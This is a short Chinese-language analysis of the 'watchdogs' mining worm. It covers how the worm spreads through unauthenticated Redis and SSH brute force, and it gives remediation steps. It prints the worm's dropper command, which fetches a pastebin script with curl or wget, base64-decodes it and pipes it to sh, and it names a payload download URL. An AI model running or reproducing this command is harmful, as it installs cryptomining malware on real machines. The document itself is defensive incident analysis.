# watchdogs
2019.2.22 通过redis未授权、SSH爆破等途径入侵传播

### pastebin.com/raw/sByq0rym
开始执行的脚本，内容为:
```
(curl -fsSL https://pastebin.com/raw/tqJjUD9d||wget -q -O- https://pastebin.com/raw/tqJjUD9d)|base64 -d|sh
```

### tqJjUD9d.sh
首先执行的恶意脚本，写入定时任务及结束一些同行进程，下载了```http://thyrsi.com/t6/672/1550667479x1822611209.jpg```,
作者还在最后加了声明。。。
```
#1.If you crack my program, please don't reveal too much code online.Many hacker boys have copied my kworkerds code,more systems are being attacked.(Especially libioset)
#2.I used to want a secure network,social change of humanity,but I really don't like being bad hacker.
#3.All data is safe,only mining
#
```

### watchdogs
恶意挖矿程序本体


### 解决办法
```
1、删除恶意动态链接库 /usr/local/lib/libioset.so；
2、排查清理 /etc/ld.so.preload 中是否加载1中的恶意动态链接库；
3、清理 crontab 异常项，删除恶意任务(无法修改则先执行5-a)；
4、kill 挖矿进程；
5、排查清理可能残留的恶意文件；
a.chattr -i /usr/sbin/watchdogs /etc/init.d/watchdogs /var/spool/cron/root /etc/cron.d/root
b. chkconfig watchdogs off
c. rm -f /usr/sbin/watchdogs /etc/init.d/watchdogs
7、相关系统命令可能被病毒删除，可通过包管理器重新安装或者其他机器拷贝恢复；
8、 由于文件只读且相关命令被 hook，需要安装 busybox 通过 busybox rm 命令删除；
9、部分操作需要重启机器生效。
```

### 细节参考
https://mp.weixin.qq.com/s/dwY--BLzcyeXqPUZlhb__Q

